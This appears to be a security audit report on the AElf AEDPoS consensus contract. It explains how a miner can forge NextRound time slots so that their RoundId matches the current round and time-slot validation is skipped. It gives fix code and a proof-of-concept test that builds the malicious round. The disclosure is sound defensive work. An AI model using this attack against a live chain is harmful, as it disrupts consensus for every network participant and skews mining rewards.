# Audit Report

## Title
RoundId Manipulation Bypasses Time Slot Validation in NextRound Consensus Transitions

## Summary
A malicious miner can craft a NextRound with arbitrary `ExpectedMiningTime` values that sum to equal the current `BaseRound.RoundId`, causing `TimeSlotValidationProvider` to incorrectly skip the critical `CheckRoundTimeSlots()` validation. This allows acceptance of a consensus round with severely unequal time slots, breaking the AEDPoS scheduling mechanism and enabling consensus disruption.

## Finding Description

The vulnerability exists in the time slot validation logic during NextRound transitions. The `TimeSlotValidationProvider` uses RoundId equality to determine whether to validate time slots for a new round: [1](#0-0) 

The `RoundId` property is calculated as the sum of all miners' `ExpectedMiningTime.Seconds` values: [2](#0-1) 

**Root Cause**: The logic assumes that if `ProvidedRound.RoundId == BaseRound.RoundId`, it's not a new round and only needs to check the individual miner's time slot. However, an attacker can craft a NextRound with manipulated `ExpectedMiningTime` values that deliberately sum to match `BaseRound.RoundId`.

**Attack Execution Flow**:

1. During their valid mining slot, the attacker queries the current `BaseRound.RoundId` (e.g., 28.9 billion for 17 miners)

2. The attacker crafts malicious NextRound consensus data with manipulated `ExpectedMiningTime` values that sum to the target RoundId while having severely unequal intervals

3. The validation flow for NextRound behavior invokes multiple validators: [3](#0-2) 

4. `RoundTerminateValidationProvider` only validates `RoundNumber` increments and `InValue` nullity, not `ExpectedMiningTime` values: [4](#0-3) 

5. `TimeSlotValidationProvider` sees equal RoundIds and skips `CheckRoundTimeSlots()`, only checking the attacker's individual time slot

6. The `CheckRoundTimeSlots()` method would normally reject invalid time slot distributions by verifying equal intervals: [5](#0-4) 

However, this validation never executes due to the bypassed condition.

7. The malicious round is stored via `AddRoundInformation`: [6](#0-5) 

And processed in NextRound: [7](#0-6) 

**Alternative Attack Vector**: An attacker can set some `ExpectedMiningTime` values to null and directly manipulate the `round_id_for_validation` field, which is used when ExpectedMiningTime values are null (Round.cs line 22).

## Impact Explanation

**Consensus Integrity Violation**: The accepted malicious round contains arbitrary, unequal time slots that violate the fundamental AEDPoS consensus invariant that all miners should have equal mining intervals.

**Concrete Harms**:

1. **Consensus Disruption**: Miners with compressed time slots (e.g., 1-second intervals) cannot physically produce blocks in their assigned windows, while miners with extended slots (years into the future) effectively monopolize block production. The consensus schedule becomes completely broken.

2. **Chain Degradation Risk**: If critical miners receive invalid time slots, consensus may fail to progress properly. Subsequent rounds would be generated based on the malicious round's timing, inheriting the broken assumptions.

3. **Reward Manipulation**: Unequal time slot distribution enables unfair block production distribution and associated mining rewards. Miners with favorable slots can produce significantly more blocks than intended.

4. **Network-Wide Impact**: All network participants are affected as the consensus mechanism breaks down. Honest miners cannot operate according to their assigned slots, and transaction finality may be degraded or halted.

**Severity**: HIGH - This directly compromises a core consensus invariant with practical exploitation requiring only current miner privileges.

## Likelihood Explanation

**Attacker Requirements**:
- Must be a current miner (validated by `MiningPermissionValidationProvider`)
- Must produce a block during their valid time slot in the current round

**Attack Complexity**: LOW
- Simple arithmetic to calculate target sum and distribute across miners
- No cryptographic breaking required
- No race conditions or complex timing dependencies
- Single transaction execution via the NextRound public method: [8](#0-7) 

**Feasibility Conditions**:
- `BaseRound.RoundId` is publicly readable state
- Valid `Timestamp.Seconds` range easily accommodates attack values
- Block producers control the consensus extra data in blocks they produce
- No additional checks validate `ExpectedMiningTime` reasonableness or distribution

**Probability**: HIGH - Any malicious miner can execute this attack during their time slot with near certainty of success.

## Recommendation

Add explicit validation of `ExpectedMiningTime` distribution in the `RoundTerminateValidationProvider` or create a dedicated validator for NextRound behavior:

```csharp
private ValidationResult ValidationForNextRound(ConsensusValidationContext validationContext)
{
    var extraData = validationContext.ExtraData;
    
    // Existing checks
    if (validationContext.BaseRound.RoundNumber.Add(1) != extraData.Round.RoundNumber)
        return new ValidationResult { Message = "Incorrect round number for next round." };

    if (extraData.Round.RealTimeMinersInformation.Values.Any(m => m.InValue != null))
        return new ValidationResult { Message = "Incorrect next round information." };
    
    // NEW: Always validate time slots for NextRound regardless of RoundId
    var timeSlotValidation = extraData.Round.CheckRoundTimeSlots();
    if (!timeSlotValidation.Success)
        return timeSlotValidation;
    
    return new ValidationResult { Success = true };
}
```

Alternatively, modify `TimeSlotValidationProvider` to always validate time slots for NextRound behavior:

```csharp
public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
{
    var validationResult = new ValidationResult();
    
    // For NextRound behavior, always validate time slots
    if (validationContext.ExtraData.Behaviour == AElfConsensusBehaviour.NextRound)
    {
        validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
        if (!validationResult.Success) return validationResult;
    }
    else if (validationContext.ProvidedRound.RoundId != validationContext.BaseRound.RoundId)
    {
        validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
        if (!validationResult.Success) return validationResult;
    }
    else
    {
        if (!CheckMinerTimeSlot(validationContext))
        {
            validationResult.Message = $"Time slot already passed before execution.{validationContext.SenderPubkey}";
            validationResult.IsReTrigger = true;
            return validationResult;
        }
    }

    validationResult.Success = true;
    return validationResult;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task RoundIdManipulation_BypassesTimeSlotValidation()
{
    // Setup: Initialize consensus with 17 miners
    var initialMiners = GenerateMinerList(17);
    await InitializeConsensus(initialMiners);
    
    // Attacker is miner at index 0
    var attackerKeyPair = initialMiners[0];
    
    // Get current round information
    var currentRound = await GetCurrentRound();
    var baseRoundId = currentRound.RoundId; // e.g., 28,900,000,000 for 17 miners
    
    // Craft malicious NextRound with ExpectedMiningTime values that sum to baseRoundId
    var maliciousRound = new Round
    {
        RoundNumber = currentRound.RoundNumber + 1,
        TermNumber = currentRound.TermNumber
    };
    
    // Set 16 miners with 1 second each, and 1 miner with the remainder
    for (int i = 0; i < 16; i++)
    {
        maliciousRound.RealTimeMinersInformation[initialMiners[i].PublicKey.ToHex()] = new MinerInRound
        {
            Pubkey = initialMiners[i].PublicKey.ToHex(),
            Order = i + 1,
            ExpectedMiningTime = Timestamp.FromDateTime(DateTime.UtcNow.AddSeconds(1))
        };
    }
    
    // Last miner gets the remainder to make sum equal baseRoundId
    var lastMinerSeconds = baseRoundId - 16;
    maliciousRound.RealTimeMinersInformation[initialMiners[16].PublicKey.ToHex()] = new MinerInRound
    {
        Pubkey = initialMiners[16].PublicKey.ToHex(),
        Order = 17,
        ExpectedMiningTime = new Timestamp { Seconds = lastMinerSeconds }
    };
    
    // Verify RoundIds match
    Assert.Equal(baseRoundId, maliciousRound.RoundId);
    
    // Attacker calls NextRound during their valid time slot
    var nextRoundInput = NextRoundInput.Create(maliciousRound, GenerateRandomNumber());
    var result = await ConsensusStub.NextRound.SendAsync(nextRoundInput);
    
    // Attack succeeds - malicious round is stored despite unequal time slots
    Assert.True(result.TransactionResult.Status == TransactionResultStatus.Mined);
    
    var newRound = await GetCurrentRound();
    
    // Verify malicious round was stored with unequal time slots
    Assert.Equal(maliciousRound.RoundNumber, newRound.RoundNumber);
    
    // Verify time slots are severely unequal (violates consensus invariant)
    var minersList = newRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order).ToList();
    var interval1 = (minersList[1].ExpectedMiningTime - minersList[0].ExpectedMiningTime).Seconds;
    var interval2 = (minersList[16].ExpectedMiningTime - minersList[15].ExpectedMiningTime).Seconds;
    
    Assert.True(Math.Abs(interval2 - interval1) > 1000000); // Intervals differ by over 1 million seconds
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/TimeSlotValidationProvider.cs (L14-18)
```csharp
        if (validationContext.ProvidedRound.RoundId != validationContext.BaseRound.RoundId)
        {
            // Is new round information fits time slot rule?
            validationResult = validationContext.ProvidedRound.CheckRoundTimeSlots();
            if (!validationResult.Success) return validationResult;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L15-24)
```csharp
    public long RoundId
    {
        get
        {
            if (RealTimeMinersInformation.Values.All(bpInfo => bpInfo.ExpectedMiningTime != null))
                return RealTimeMinersInformation.Values.Select(bpInfo => bpInfo.ExpectedMiningTime.Seconds).Sum();

            return RoundIdForValidation;
        }
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L33-58)
```csharp
    public ValidationResult CheckRoundTimeSlots()
    {
        var miners = RealTimeMinersInformation.Values.OrderBy(m => m.Order).ToList();
        if (miners.Count == 1)
            // No need to check single node.
            return new ValidationResult { Success = true };

        if (miners.Any(m => m.ExpectedMiningTime == null))
            return new ValidationResult { Message = $"Incorrect expected mining time.\n{this}" };

        var baseMiningInterval =
            (miners[1].ExpectedMiningTime - miners[0].ExpectedMiningTime).Milliseconds();

        if (baseMiningInterval <= 0)
            return new ValidationResult { Message = $"Mining interval must greater than 0.\n{this}" };

        for (var i = 1; i < miners.Count - 1; i++)
        {
            var miningInterval =
                (miners[i + 1].ExpectedMiningTime - miners[i].ExpectedMiningTime).Milliseconds();
            if (Math.Abs(miningInterval - baseMiningInterval) > baseMiningInterval)
                return new ValidationResult { Message = "Time slots are so different." };
        }

        return new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L84-88)
```csharp
            case AElfConsensusBehaviour.NextRound:
                // Is sender's order of next round correct?
                validationProviders.Add(new NextRoundMiningOrderValidationProvider());
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L22-35)
```csharp
    private ValidationResult ValidationForNextRound(ConsensusValidationContext validationContext)
    {
        // Is next round information correct?
        // Currently two aspects:
        //   Round Number
        //   In Values Should Be Null
        var extraData = validationContext.ExtraData;
        if (validationContext.BaseRound.RoundNumber.Add(1) != extraData.Round.RoundNumber)
            return new ValidationResult { Message = "Incorrect round number for next round." };

        return extraData.Round.RealTimeMinersInformation.Values.Any(m => m.InValue != null)
            ? new ValidationResult { Message = "Incorrect next round information." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_HelpMethods.cs (L103-105)
```csharp
    private void AddRoundInformation(Round round)
    {
        State.Rounds.Set(round.RoundNumber, round);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L108-159)
```csharp
    private void ProcessNextRound(NextRoundInput input)
    {
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        TryToGetCurrentRoundInformation(out var currentRound);

        // Do some other stuff during the first time to change round.
        if (currentRound.RoundNumber == 1)
        {
            // Set blockchain start timestamp.
            var actualBlockchainStartTimestamp =
                currentRound.FirstActualMiner()?.ActualMiningTimes.FirstOrDefault() ??
                Context.CurrentBlockTime;
            SetBlockchainStartTimestamp(actualBlockchainStartTimestamp);

            // Initialize current miners' information in Election Contract.
            if (State.IsMainChain.Value)
            {
                var minersCount = GetMinersCount(nextRound);
                if (minersCount != 0 && State.ElectionContract.Value != null)
                {
                    State.ElectionContract.UpdateMinersCount.Send(new UpdateMinersCountInput
                    {
                        MinersCount = minersCount
                    });
                }
            }
        }

        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }

        AddRoundInformation(nextRound);

        Assert(TryToUpdateRoundNumber(nextRound.RoundNumber), "Failed to update round number.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L161-166)
```csharp
    public override Empty NextRound(NextRoundInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
    }
```
